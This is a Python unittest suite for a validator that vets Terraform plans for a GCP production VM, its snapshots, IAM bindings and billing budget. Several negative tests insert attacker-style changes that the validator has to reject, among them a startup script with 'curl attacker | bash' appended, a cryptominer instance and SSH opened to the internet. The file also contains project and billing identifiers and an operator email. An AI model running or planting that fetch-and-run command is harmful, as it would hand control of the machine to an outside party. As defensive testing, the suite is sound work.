from __future__ import annotations

import copy
import hashlib
import importlib.util
from pathlib import Path
import unittest


SCRIPT = Path(__file__).parents[1] / "scripts" / "verify-terraform-plan.py"
SPEC = importlib.util.spec_from_file_location("verify_terraform_plan", SCRIPT)
assert SPEC and SPEC.loader
MODULE = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(MODULE)


STATIC_NAME = "he-testbed-feedback-ip"
STATIC_IP = "35.216.80.123"
PROJECT_ID = "project-72a52bf1-06aa-4519-b2c"
PROJECT_NUMBER = "336721527881"
BILLING_ACCOUNT_ID = "01B490-1BC53A-33E611"
BUDGET_ID = "b645c912-d766-43fc-8923-bff70ecfe8d8"
BUDGET_AMOUNT_KRW = "370000"
RUNTIME_EMAIL = f"gole-production-runtime@{PROJECT_ID}.iam.gserviceaccount.com"
STARTUP_SCRIPT = "#!/usr/bin/env bash\nset -euo pipefail\n# independently reviewed fixture\n"
STARTUP_SHA256 = hashlib.sha256(STARTUP_SCRIPT.encode()).hexdigest()


def resource(address: str, before: dict, after: dict, actions: list[str]) -> dict:
    return {
        "address": address,
        "type": address.split(".", 1)[0],
        "change": {"actions": actions, "before": before, "after": after},
    }


def instance_state(ip: str) -> dict:
    labels = {"app": "gole", "environment": "production", "managed-by": "terraform"}
    return {
        "name": "gole-production",
        "project": PROJECT_ID,
        "zone": "asia-northeast3-a",
        "network_interface": [
            {
                "network": "default",
                "alias_ip_range": [],
                "ipv6_access_config": [],
                "access_config": [{"nat_ip": ip, "network_tier": "STANDARD"}],
            }
        ],
        "deletion_protection": True,
        "allow_stopping_for_update": True,
        "machine_type": "e2-standard-2",
        "tags": ["gole-web", "gole-ssh-iap"],
        "labels": labels,
        "effective_labels": copy.deepcopy(labels),
        "terraform_labels": copy.deepcopy(labels),
        "metadata": {
            "enable-oslogin": "TRUE",
            "gole-budget-id": BUDGET_ID,
            "startup-script": STARTUP_SCRIPT,
        },
        "boot_disk": [{"auto_delete": False, "initialize_params": [{
            "image": "projects/ubuntu-os-cloud/global/images/ubuntu-2404-noble-amd64-v20260826",
            "size": 100,
            "type": "pd-balanced",
        }]}],
        "service_account": [{"email": RUNTIME_EMAIL, "scopes": ["cloud-platform"]}],
        "shielded_instance_config": [{
            "enable_secure_boot": True,
            "enable_vtpm": True,
            "enable_integrity_monitoring": True,
        }],
        "scheduling": [{"automatic_restart": True, "on_host_maintenance": "MIGRATE"}],
        "resource_policies": [],
    }


def snapshot_state() -> dict:
    return {
        "name": "gole-production-daily-snapshots",
        "project": PROJECT_ID,
        "region": "asia-northeast3",
        "description": "Daily three-day recovery points for the GoLe production boot disk",
        "disk_consistency_group_policy": [],
        "group_placement_policy": [],
        "instance_schedule_policy": [],
        "workload_policy": [],
        "snapshot_schedule_policy": [
            {
                "schedule": [
                    {"daily_schedule": [{"days_in_cycle": 1, "start_time": "20:00"}]}
                ],
                "retention_policy": [
                    {
                        "max_retention_days": 3,
                        "on_source_disk_delete": "APPLY_RETENTION_POLICY",
                    }
                ],
                "snapshot_properties": [
                    {
                        "chain_name": None,
                        "guest_flush": False,
                        "storage_locations": ["asia-northeast3"],
                        "labels": {
                            "app": "gole",
                            "environment": "production",
                            "backup": "daily",
                            "managed-by": "terraform",
                        },
                    }
                ],
            }
        ],
    }


def budget_state(*, project_recipients: bool = True) -> dict:
    return {
        "all_updates_rule": [{
            "disable_default_iam_recipients": False,
            "enable_project_level_recipients": project_recipients,
            "monitoring_notification_channels": [],
            "pubsub_topic": f"projects/{PROJECT_ID}/topics/gole-billing-budget",
            "schema_version": "1.0",
        }],
        "amount": [{
            "last_period_amount": False,
            "specified_amount": [{
                "currency_code": "KRW",
                "nanos": 0,
                "units": BUDGET_AMOUNT_KRW,
            }],
        }],
        "billing_account": BILLING_ACCOUNT_ID,
        "budget_filter": [{
            "calendar_period": "",
            "credit_types": [],
            "credit_types_treatment": "EXCLUDE_ALL_CREDITS",
            "custom_period": [{
                "end_date": [{"day": 28, "month": 10, "year": 2026}],
                "start_date": [{"day": 1, "month": 9, "year": 2026}],
            }],
            "labels": {},
            "projects": [f"projects/{PROJECT_NUMBER}"],
            "resource_ancestors": [],
            "services": [],
            "subaccounts": [],
        }],
        "display_name": "GoLe production credit guard",
        "id": f"billingAccounts/{BILLING_ACCOUNT_ID}/budgets/{BUDGET_ID}",
        "name": BUDGET_ID,
        "ownership_scope": "",
        "threshold_rules": [
            {"spend_basis": "CURRENT_SPEND", "threshold_percent": value}
            for value in (0.5, 0.75, 0.85, 0.9, 0.95, 1.0)
        ],
    }


def safe_plan() -> dict:
    address = {
        "name": STATIC_NAME,
        "address": STATIC_IP,
        "network_tier": "STANDARD",
        "description": "HE Testbed external feedback endpoint",
    }
    instance = instance_state(STATIC_IP)
    instance_before = copy.deepcopy(instance)
    instance_before["allow_stopping_for_update"] = None
    instance_before["deletion_protection"] = False
    instance_before["machine_type"] = "e2-custom-4-8192"
    instance_before["labels"] = {}
    instance_before["effective_labels"] = {
        "app": "gole",
        "environment": "production",
        "managed-by": "codex",
    }
    instance_before["terraform_labels"] = {}
    instance_before["metadata"] = {"enable-oslogin": "FALSE"}
    instance_before["boot_disk"][0]["auto_delete"] = True
    changes = [
            resource("google_compute_address.gole", address, copy.deepcopy(address), ["no-op"]),
            resource("google_compute_instance.gole", instance_before, copy.deepcopy(instance), ["update"]),
            resource(
                "google_compute_resource_policy.daily_boot_disk_snapshots",
                None,
                snapshot_state(),
                ["create"],
            ),
            resource(
                "google_compute_disk_resource_policy_attachment.daily_boot_disk_snapshots",
                None,
                {
                    "name": "gole-production-daily-snapshots",
                    "disk": "gole-production",
                    "project": PROJECT_ID,
                    "zone": "asia-northeast3-a",
                },
                ["create"],
            ),
        ]
    existing_stubs = MODULE.REQUIRED_EXISTING_RESOURCES - {
        "google_compute_address.gole",
        "google_compute_instance.gole",
    }
    for item in sorted(existing_stubs):
        after: dict = {}
        project_services = {
            "google_project_service.compute": "compute.googleapis.com",
            "google_project_service.resource_manager": "cloudresourcemanager.googleapis.com",
            "google_project_service.pubsub": "pubsub.googleapis.com",
            "google_project_service.billing_budgets": "billingbudgets.googleapis.com",
            "google_project_service.public_ca": "publicca.googleapis.com",
            "google_project_service.iam": "iam.googleapis.com",
            "google_project_service.secret_manager": "secretmanager.googleapis.com",
        }
        if item in project_services:
            after = {"service": project_services[item], "disable_on_destroy": False}
        elif item == "google_service_account.production_runtime":
            after = {"account_id": "gole-production-runtime", "email": RUNTIME_EMAIL}
        elif item == "google_secret_manager_secret.production_env":
            secret_labels = {
                "environment": "production",
                "managed-by": "kscold-control",
            }
            after = {
                "secret_id": "gole-production-env",
                "project": PROJECT_ID,
                "labels": secret_labels,
                "effective_labels": copy.deepcopy(secret_labels),
                "terraform_labels": copy.deepcopy(secret_labels),
                "replication": [{
                    "auto": [{"customer_managed_encryption": []}],
                    "user_managed": [],
                }],
                "expire_time": "",
                "ttl": None,
                "rotation": [],
                "topics": [],
                "version_aliases": {},
            }
        elif item == "google_project_iam_custom_role.budget_subscription_consumer":
            after = {"role_id": "goleBudgetSubscriptionConsumer", "permissions": ["pubsub.subscriptions.consume"], "stage": "GA"}
        elif item == "google_secret_manager_secret_iam_member.production_env_accessor":
            after = {
                "condition": [],
                "project": PROJECT_ID,
                "secret_id": f"projects/{PROJECT_ID}/secrets/gole-production-env",
                "role": "roles/secretmanager.secretAccessor",
                "member": f"serviceAccount:{RUNTIME_EMAIL}",
            }
        elif item == "google_pubsub_topic_iam_member.billing_budget_publisher":
            after = {
                "condition": [],
                "project": PROJECT_ID,
                "topic": f"projects/{PROJECT_ID}/topics/gole-billing-budget",
                "role": "roles/pubsub.publisher",
                "member": "serviceAccount:billing-budget-alert@system.gserviceaccount.com",
            }
        elif item == "google_pubsub_subscription_iam_member.budget_relay_subscriber":
            after = {
                "condition": [],
                "project": None,
                "subscription": (
                    f"projects/{PROJECT_ID}/subscriptions/"
                    "gole-billing-budget-discord"
                ),
                "role": f"projects/{PROJECT_ID}/roles/goleBudgetSubscriptionConsumer",
                "member": f"serviceAccount:{RUNTIME_EMAIL}",
            }
        elif item == "google_compute_firewall.web":
            after = firewall("gole-web", 1000, ["0.0.0.0/0"], ["gole-web"], allow=[{"ports": ["80", "443"], "protocol": "tcp"}])
        elif item == "google_compute_firewall.ssh_iap":
            after = firewall("gole-ssh-iap", 800, ["35.235.240.0/20"], ["gole-ssh-iap"], allow=[{"ports": ["22"], "protocol": "tcp"}])
        elif item == "google_compute_firewall.deny_public_admin":
            after = firewall("gole-deny-public-admin", 900, ["0.0.0.0/0"], ["gole-ssh-iap"], deny=[{"ports": ["22", "3389"], "protocol": "tcp"}])
        elif item == "google_pubsub_topic.billing_budget":
            after = {"name": "gole-billing-budget"}
        elif item == "google_pubsub_subscription.billing_budget_discord":
            after = {
                "name": "gole-billing-budget-discord",
                "topic": "gole-billing-budget",
                "ack_deadline_seconds": 60,
                "message_retention_duration": "604800s",
            }
        elif item == MODULE.BUDGET_RESOURCE:
            after = budget_state()
        changes.append(resource(item, copy.deepcopy(after), after, ["no-op"]))
    for item, role in (
        ("google_project_iam_member.operator_os_admin", "roles/compute.osAdminLogin"),
        ("google_project_iam_member.operator_iap_tunnel", "roles/iap.tunnelResourceAccessor"),
        ("google_service_account_iam_member.operator_service_account_user", "roles/iam.serviceAccountUser"),
    ):
        iam_after = {
            "condition": [],
            "role": role,
            "member": "user:coldingcontact@gmail.com",
        }
        if item.startswith("google_project_iam_member."):
            iam_after["project"] = PROJECT_ID
        else:
            iam_after["service_account_id"] = (
                f"projects/{PROJECT_ID}/serviceAccounts/{RUNTIME_EMAIL}"
            )
        changes.append(resource(item, None, iam_after, ["create"]))
    return {"resource_changes": changes}


def firewall(name: str, priority: int, sources: list[str], tags: list[str], *, allow=None, deny=None) -> dict:
    descriptions = {
        "gole-web": "GoLe public HTTP and HTTPS",
        "gole-ssh-iap": "SSH through Google IAP only",
        "gole-deny-public-admin": "",
    }
    return {
        "name": name,
        "description": descriptions[name],
        "network": "default",
        "direction": "INGRESS",
        "priority": priority,
        "source_ranges": sources,
        "target_tags": tags,
        "source_tags": [],
        "source_service_accounts": [],
        "target_service_accounts": [],
        "allow": allow or [],
        "deny": deny or [],
    }


class ExistingPlanPolicyTest(unittest.TestCase):
    def validate(self, plan: dict) -> None:
        MODULE.validate_existing_plan(
            plan,
            expected_static_ip_name=STATIC_NAME,
            expected_static_ip=STATIC_IP,
            expected_project_id=PROJECT_ID,
            expected_project_number=PROJECT_NUMBER,
            expected_billing_account_id=BILLING_ACCOUNT_ID,
            expected_budget_id=BUDGET_ID,
            expected_budget_amount_krw=BUDGET_AMOUNT_KRW,
            expected_startup_script_sha256=STARTUP_SHA256,
        )

    def test_allows_in_place_vm_update_and_new_snapshot_policy(self) -> None:
        self.validate(safe_plan())

    def test_allows_only_reviewed_boot_disk_auto_delete_states(self) -> None:
        already_disabled = safe_plan()
        already_disabled["resource_changes"][1]["change"]["before"]["boot_disk"][0][
            "auto_delete"
        ] = False
        self.validate(already_disabled)

        for location, value in (("before", None), ("before", "true"), ("after", True)):
            with self.subTest(location=location, value=value):
                plan = safe_plan()
                plan["resource_changes"][1]["change"][location]["boot_disk"][0][
                    "auto_delete"
                ] = value
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_allows_already_managed_adoption_resources_as_no_ops(self) -> None:
        plan = safe_plan()
        for change in plan["resource_changes"]:
            if change["address"] in MODULE.REQUIRED_ADOPTION_RESOURCES:
                change["change"]["before"] = copy.deepcopy(change["change"]["after"])
                change["change"]["actions"] = ["no-op"]
        self.validate(plan)

    def test_allows_only_the_reviewed_budget_recipient_migration(self) -> None:
        plan = safe_plan()
        budget = next(
            item
            for item in plan["resource_changes"]
            if item["address"] == MODULE.BUDGET_RESOURCE
        )
        budget["change"]["before"] = budget_state(project_recipients=False)
        budget["change"]["actions"] = ["update"]
        self.validate(plan)

    def test_allows_only_the_live_missing_budget_notification_route_repair(self) -> None:
        for missing_route in (None, []):
            with self.subTest(missing_route=missing_route):
                plan = safe_plan()
                budget = next(
                    item
                    for item in plan["resource_changes"]
                    if item["address"] == MODULE.BUDGET_RESOURCE
                )
                budget["change"]["before"]["all_updates_rule"] = missing_route
                budget["change"]["actions"] = ["update"]
                self.validate(plan)

        plan = safe_plan()
        budget = next(
            item
            for item in plan["resource_changes"]
            if item["address"] == MODULE.BUDGET_RESOURCE
        )
        budget["change"]["before"]["all_updates_rule"] = []
        budget["change"]["actions"] = ["update"]
        for malformed_before in ({}, [{"pubsub_topic": "projects/foreign/topics/billing"}]):
            with self.subTest(malformed_before=malformed_before):
                invalid = copy.deepcopy(plan)
                invalid_budget = next(
                    item
                    for item in invalid["resource_changes"]
                    if item["address"] == MODULE.BUDGET_RESOURCE
                )
                invalid_budget["change"]["before"]["all_updates_rule"] = malformed_before
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(invalid)

        missing_key = copy.deepcopy(plan)
        missing_key_budget = next(
            item
            for item in missing_key["resource_changes"]
            if item["address"] == MODULE.BUDGET_RESOURCE
        )
        del missing_key_budget["change"]["before"]["all_updates_rule"]
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(missing_key)

        unrelated = copy.deepcopy(plan)
        unrelated_budget = next(
            item
            for item in unrelated["resource_changes"]
            if item["address"] == MODULE.BUDGET_RESOURCE
        )
        unrelated_budget["change"]["after"]["display_name"] = "Unexpected budget"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(unrelated)

    def test_rejects_budget_scope_amount_or_route_changes(self) -> None:
        mutations = []
        for mutation in ("amount", "project", "topic"):
            plan = safe_plan()
            budget = next(
                item
                for item in plan["resource_changes"]
                if item["address"] == MODULE.BUDGET_RESOURCE
            )
            if mutation == "amount":
                budget["change"]["after"]["amount"][0]["specified_amount"][0][
                    "units"
                ] = "999999"
            elif mutation == "project":
                budget["change"]["after"]["budget_filter"][0]["projects"] = [
                    "projects/999999999999"
                ]
            else:
                budget["change"]["after"]["all_updates_rule"][0][
                    "pubsub_topic"
                ] = "projects/foreign/topics/gole-billing-budget"
            mutations.append(plan)

        for plan in mutations:
            with self.subTest():
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_unimported_address_create(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][0]["change"] = {
            "actions": ["create"],
            "before": None,
            "after": {"name": STATIC_NAME, "address": None},
        }
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_missing_existing_billing_budget(self) -> None:
        plan = safe_plan()
        plan["resource_changes"] = [
            item
            for item in plan["resource_changes"]
            if item["address"] != MODULE.BUDGET_RESOURCE
        ]
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_address_rename_replacement(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][0]["change"]["actions"] = ["delete", "create"]
        plan["resource_changes"][0]["change"]["after"]["name"] = "gole-production-ip"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_instance_nat_ip_change(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][1]["change"]["after"] = instance_state("35.216.80.124")
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_address_or_instance_network_tier_change(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][0]["change"]["after"]["network_tier"] = "PREMIUM"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

        plan = safe_plan()
        plan["resource_changes"][1]["change"]["after"]["network_interface"][0][
            "access_config"
        ][0]["network_tier"] = "PREMIUM"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_missing_deletion_protection_or_os_login(self) -> None:
        for key, value in (("deletion_protection", False), ("metadata", {})):
            with self.subTest(key=key):
                plan = safe_plan()
                plan["resource_changes"][1]["change"]["after"][key] = value
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_wrong_machine_shape_or_instance_schedule(self) -> None:
        for key, value in (
            ("machine_type", "e2-custom-4-8192"),
            ("resource_policies", ["he-testbed-office-hours"]),
        ):
            with self.subTest(key=key):
                plan = safe_plan()
                plan["resource_changes"][1]["change"]["after"][key] = value
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_unreviewed_vm_transition_fields(self) -> None:
        mutations = {
            "desired_status": lambda instance: instance.update(
                desired_status="TERMINATED"
            ),
            "metadata_startup_script": lambda instance: instance.update(
                metadata_startup_script="#!/bin/sh\nid\n"
            ),
            "advanced_machine_features": lambda instance: instance.update(
                advanced_machine_features=[{"enable_nested_virtualization": True}]
            ),
            "confidential_instance_config": lambda instance: instance.update(
                confidential_instance_config=[{"enable_confidential_compute": True}]
            ),
            "subnetwork": lambda instance: instance["network_interface"][0].update(
                subnetwork="attacker-subnetwork"
            ),
            "network_ip": lambda instance: instance["network_interface"][0].update(
                network_ip="10.178.0.99"
            ),
            "network": lambda instance: instance["network_interface"][0].update(
                network="attacker-network"
            ),
            "access_config": lambda instance: instance["network_interface"][0][
                "access_config"
            ][0].update(public_ptr_domain_name="attacker.example"),
            "preemptible": lambda instance: instance["scheduling"][0].update(
                preemptible=True
            ),
            "provisioning_model": lambda instance: instance["scheduling"][0].update(
                provisioning_model="SPOT"
            ),
            "max_run_duration": lambda instance: instance["scheduling"][0].update(
                max_run_duration=[{"seconds": 60}]
            ),
            "termination_action": lambda instance: instance["scheduling"][0].update(
                instance_termination_action="STOP"
            ),
            "can_ip_forward": lambda instance: instance.update(can_ip_forward=True),
            "enable_display": lambda instance: instance.update(enable_display=True),
            "tags": lambda instance: instance.update(tags=["gole-web", "attacker"]),
        }
        for name, mutate in mutations.items():
            with self.subTest(name=name):
                plan = safe_plan()
                instance = plan["resource_changes"][1]["change"]["after"]
                mutate(instance)
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_unknown_vm_after_value(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][1]["change"]["after_unknown"] = {
            "desired_status": True
        }
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_allows_only_provider_computed_create_unknowns(self) -> None:
        plan = safe_plan()
        masks = {
            MODULE.SNAPSHOT_POLICY_RESOURCE: {
                "id": True,
                "self_link": True,
                "snapshot_schedule_policy": [
                    {
                        "retention_policy": [{}],
                        "schedule": [{"daily_schedule": [{}]}],
                        "snapshot_properties": [
                            {"labels": {}, "storage_locations": [False]}
                        ],
                    }
                ],
            },
            MODULE.SNAPSHOT_ATTACHMENT_RESOURCE: {"id": True},
            "google_project_iam_member.operator_os_admin": {
                "condition": [],
                "etag": True,
                "id": True,
            },
            "google_project_iam_member.operator_iap_tunnel": {
                "condition": [],
                "etag": True,
                "id": True,
            },
            "google_service_account_iam_member.operator_service_account_user": {
                "condition": [],
                "etag": True,
                "id": True,
            },
        }
        for item in plan["resource_changes"]:
            if item["address"] in masks:
                item["change"]["after_unknown"] = masks[item["address"]]
        self.validate(plan)

    def test_rejects_unresolved_configurable_create_values(self) -> None:
        mutations = (
            (
                "google_project_iam_member.operator_os_admin",
                {"project": True},
            ),
            (
                "google_service_account_iam_member.operator_service_account_user",
                {"service_account_id": True},
            ),
            (
                MODULE.SNAPSHOT_POLICY_RESOURCE,
                {
                    "snapshot_schedule_policy": [
                        {"snapshot_properties": [{"storage_locations": [True]}]}
                    ]
                },
            ),
            (MODULE.SNAPSHOT_ATTACHMENT_RESOURCE, {"disk": True}),
        )
        for address, unknown_mask in mutations:
            with self.subTest(address=address):
                plan = safe_plan()
                item = next(
                    value
                    for value in plan["resource_changes"]
                    if value["address"] == address
                )
                item["change"]["after_unknown"] = unknown_mask
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_allows_provider_computed_vm_bookkeeping_refresh(self) -> None:
        plan = safe_plan()
        instance_change = plan["resource_changes"][1]["change"]
        instance_change["before"].update(
            {
                "current_status": "PROVISIONING",
                "label_fingerprint": "old-computed-value",
                "metadata_fingerprint": "old-computed-value",
            }
        )
        instance_change["after"].update(
            {
                "current_status": "RUNNING",
                "label_fingerprint": "new-computed-value",
                "metadata_fingerprint": "new-computed-value",
            }
        )
        self.validate(plan)

    def test_rejects_missing_or_relaxed_snapshot_policy(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][2]["change"]["after"][
            "snapshot_schedule_policy"
        ][0]["retention_policy"][0]["max_retention_days"] = 30
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_snapshot_identity_and_policy_type_changes(self) -> None:
        mutations = {
            "project": lambda snapshot, attachment: snapshot.update(
                project="foreign-project"
            ),
            "region": lambda snapshot, attachment: snapshot.update(
                region="us-central1"
            ),
            "description": lambda snapshot, attachment: snapshot.update(
                description="unreviewed"
            ),
            "group_policy": lambda snapshot, attachment: snapshot.update(
                group_placement_policy=[{"vm_count": 2}]
            ),
            "chain": lambda snapshot, attachment: snapshot[
                "snapshot_schedule_policy"
            ][0]["snapshot_properties"][0].update(chain_name="unreviewed"),
            "attachment_project": lambda snapshot, attachment: attachment.update(
                project="foreign-project"
            ),
        }
        for name, mutate in mutations.items():
            with self.subTest(name=name):
                plan = safe_plan()
                snapshot = next(
                    item["change"]["after"]
                    for item in plan["resource_changes"]
                    if item["address"] == MODULE.SNAPSHOT_POLICY_RESOURCE
                )
                attachment = next(
                    item["change"]["after"]
                    for item in plan["resource_changes"]
                    if item["address"] == MODULE.SNAPSHOT_ATTACHMENT_RESOURCE
                )
                mutate(snapshot, attachment)
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_iam_target_project_or_condition_changes(self) -> None:
        mutations = (
            (
                "google_project_iam_member.operator_os_admin",
                "project",
                "foreign-project",
            ),
            (
                "google_project_iam_member.operator_iap_tunnel",
                "condition",
                [{"expression": "false", "title": "deny-recovery"}],
            ),
            (
                "google_service_account_iam_member.operator_service_account_user",
                "service_account_id",
                "projects/foreign/serviceAccounts/admin@foreign.iam.gserviceaccount.com",
            ),
            (
                "google_secret_manager_secret_iam_member.production_env_accessor",
                "secret_id",
                "projects/foreign/secrets/production",
            ),
            (
                "google_pubsub_topic_iam_member.billing_budget_publisher",
                "topic",
                "projects/foreign/topics/billing",
            ),
            (
                "google_pubsub_subscription_iam_member.budget_relay_subscriber",
                "subscription",
                "projects/foreign/subscriptions/billing",
            ),
        )
        for address, field, value in mutations:
            with self.subTest(address=address, field=field):
                plan = safe_plan()
                iam = next(
                    item["change"]["after"]
                    for item in plan["resource_changes"]
                    if item["address"] == address
                )
                iam[field] = value
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_any_unrelated_destroy(self) -> None:
        plan = safe_plan()
        plan["resource_changes"].append(
            resource("google_compute_firewall.web", {"name": "gole-web"}, None, ["delete"])
        )
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_unreviewed_create_update_and_startup_script(self) -> None:
        mutations = []
        extra_vm = safe_plan()
        extra_vm["resource_changes"].append(
            resource("google_compute_instance.cryptominer", None, {"machine_type": "a3-highgpu-8g"}, ["create"])
        )
        mutations.append(extra_vm)

        firewall_open = safe_plan()
        next(item for item in firewall_open["resource_changes"] if item["address"] == "google_compute_firewall.ssh_iap")["change"]["after"]["source_ranges"] = ["0.0.0.0/0"]
        mutations.append(firewall_open)

        startup = safe_plan()
        startup["resource_changes"][1]["change"]["after"]["metadata"]["startup-script"] += "curl attacker | bash\n"
        mutations.append(startup)

        budget_identity = safe_plan()
        budget_identity["resource_changes"][1]["change"]["after"]["metadata"][
            "gole-budget-id"
        ] = "00000000-0000-0000-0000-000000000000"
        mutations.append(budget_identity)

        disk = safe_plan()
        disk["resource_changes"][1]["change"]["after"]["boot_disk"][0]["initialize_params"][0]["size"] = 10000
        mutations.append(disk)

        scope = safe_plan()
        scope["resource_changes"][1]["change"]["after"]["service_account"][0]["scopes"] = ["cloud-platform", "userinfo-email"]
        mutations.append(scope)

        for plan in mutations:
            with self.subTest():
                with self.assertRaises(MODULE.PlanPolicyError):
                    self.validate(plan)

    def test_rejects_secret_version_payload_resource(self) -> None:
        plan = safe_plan()
        plan["resource_changes"].append(
            {
                "address": "google_secret_manager_secret_version.production_env",
                "type": "google_secret_manager_secret_version",
                "change": {"actions": ["create"], "before": None, "after": {}},
            }
        )
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_update_to_any_imported_non_vm_resource(self) -> None:
        for address in (
            "google_service_account.production_runtime",
            "google_pubsub_subscription.billing_budget_discord",
            "google_compute_firewall.web",
        ):
            with self.subTest(address=address):
                plan = safe_plan()
                item = next(
                    value
                    for value in plan["resource_changes"]
                    if value["address"] == address
                )
                item["change"]["actions"] = ["update"]
                with self.assertRaisesRegex(
                    MODULE.PlanPolicyError, "separate reviewed migration"
                ):
                    self.validate(plan)

    def test_rejects_secret_container_changes_beyond_label_adoption(self) -> None:
        plan = safe_plan()
        secret = next(
            item
            for item in plan["resource_changes"]
            if item["address"] == MODULE.SECRET_RESOURCE
        )
        secret["change"]["actions"] = ["update"]
        secret["change"]["after"]["expire_time"] = "2026-09-06T00:00:00Z"
        with self.assertRaises(MODULE.PlanPolicyError):
            self.validate(plan)

    def test_rejects_unknown_provider_field_and_action_vector(self) -> None:
        plan = safe_plan()
        plan["resource_changes"][1]["change"]["after"]["future_root_capability"] = True
        with self.assertRaisesRegex(MODULE.PlanPolicyError, "unreviewed provider field"):
            self.validate(plan)

        plan = safe_plan()
        plan["resource_changes"][1]["change"]["actions"] = ["read"]
        with self.assertRaisesRegex(MODULE.PlanPolicyError, "unreviewed action vector"):
            self.validate(plan)


if __name__ == "__main__":
    unittest.main()
